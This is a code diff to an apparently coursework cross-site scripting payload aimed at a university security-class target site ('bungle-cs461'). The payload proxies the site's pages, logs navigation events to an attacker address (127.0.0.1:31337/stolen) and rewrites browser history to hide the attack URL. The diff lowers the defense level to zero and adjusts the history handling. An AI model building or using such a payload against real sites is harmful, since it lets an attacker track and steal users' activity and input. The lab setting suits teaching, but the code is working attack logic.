@@ -2,7 +2,7 @@
 <meta charset="utf-8">
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 <script>
-var xssdefense = 4;
+var xssdefense = 0;
 var target = "http://bungle-cs461.cs.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 
@@ -53,10 +53,16 @@ function payload(attacker) {
                 log(attacker, {"event": "nav", "url": href});
             //$("#query").val("pwned!");   
             addEvents();
-            if(href.indexOf("search") == -1 && href != "./")
+            if(flag == 1){
                 history.replaceState({"html": $("html").html()}, null, "http://bungle-cs461.cs.illinois.edu/");
-            else
-                history.pushState({"html": $("html").html()}, null, href);
+                flag = 0;
+            } else{
+             
+                if(href.indexOf("search") == -1 && href != "./")
+                    history.replaceState({"html": $("html").html()}, null, "http://bungle-cs461.cs.illinois.edu/");
+                else
+                    history.pushState({"html": $("html").html()}, null, href);
+            }
         });
     }
     function addEvents(){
@@ -116,6 +122,7 @@ function payload(attacker) {
                 log(attacker, {"event": "nav", "url": window.location.pathname + window.location.search});
             };
     }
+    var flag = 1;
     proxy("./", null);
 }
 </script>
